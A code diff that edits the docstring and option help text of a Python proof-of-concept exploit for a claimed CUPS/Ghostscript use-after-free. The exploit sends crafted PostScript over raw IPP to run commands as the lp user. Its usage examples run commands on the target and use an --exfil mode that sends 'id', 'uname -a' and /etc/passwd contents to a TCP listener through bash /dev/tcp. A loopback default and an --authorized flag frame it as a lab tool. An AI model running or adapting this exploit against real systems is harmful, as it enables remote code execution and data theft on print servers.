@@ -1,20 +1,19 @@
 #!/usr/bin/env python3
-"""Upload2Shell (CVE-2026-125396) — standalone IPP client for Debian 13.
+"""Upload2Shell (CVE-2026-125396) - a standalone IPP client for Debian 13.
 
-Sends a PostScript document to a CUPS shared queue over raw IPP (no `lp`
-binary, no local shell on the target), which reaches `gstopdf` ->
-`gstoraster` -> `gs -dSAFER` and triggers the Type 1 font-loader UAF.
+Posts a PostScript document straight to a shared CUPS queue over raw IPP.
+No `lp` binary and no shell on the target: the job goes through gstopdf and
+gstoraster into `gs -dSAFER`, and the Type 1 font loader UAF does the rest.
+The payload clears `path_control_active`, then runs a `%pipe%` command as the
+CUPS filter account (uid=7(lp) on Debian).
 
-The payload disables `path_control_active` in memory and then runs a
-`%pipe%` command as the CUPS filter account (uid=7(lp) on Debian).
+It stays on loopback unless you pass --authorized.
 
-Local-lab first. Non-loopback targets require --authorized.
-
-Example:
+Quick go:
     python3 cups_poc.py -t 127.0.0.1:6310 -q u2s --cmd 'id > /tmp/pwned'
     docker exec u2s-pwn cat /tmp/pwned
 
-    # reverse exfil to a listener on the host (container -> host)
+Send the output back to a listener on the host:
     python3 cups_poc.py -t 127.0.0.1:6310 -q u2s \
         --exfil 172.17.0.1:9001 --cmd 'id; uname -a; cat /etc/passwd'
 """
@@ -144,7 +143,7 @@ def main(argv: Optional[list[str]] = None) -> int:
     p.add_argument("-t", "--target", required=True, help="host:port of the CUPS server")
     p.add_argument("-q", "--queue", default="u2s", help="shared queue name (default u2s)")
     p.add_argument("--cmd", default="id > /tmp/u2s_id.txt", help="command to run as lp")
-    p.add_argument("--exfil", help="HOST:PORT — wrap cmd to send output over TCP (bash /dev/tcp)")
+    p.add_argument("--exfil", help="HOST:PORT, wrap cmd to send output over TCP (bash /dev/tcp)")
     p.add_argument("--template", default=str(TEMPLATE), help="PostScript template with __CMD__")
     p.add_argument("--timeout", type=float, default=30.0, help="HTTP timeout seconds")
     p.add_argument("--authorized", action="store_true", help="allow a non-loopback target")
